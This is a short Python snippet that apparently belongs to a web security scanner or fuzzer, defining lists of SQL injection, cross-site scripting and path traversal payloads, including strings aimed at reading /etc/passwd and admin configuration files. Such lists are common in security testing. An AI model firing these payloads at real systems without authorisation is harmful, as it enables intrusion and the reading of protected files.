SQLI_PAYLOADS = ["' OR '1'='1", '" OR "1"="1', "' OR '1'='1' -- "]
XSS_PAYLOADS = ['<script>alert(1)</script>', '\"<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
TRAVERSAL_PAYLOADS = ['../etc/passwd', '../../../../../etc/passwd', '../admin/config.php', '../admin', '../admin.php']
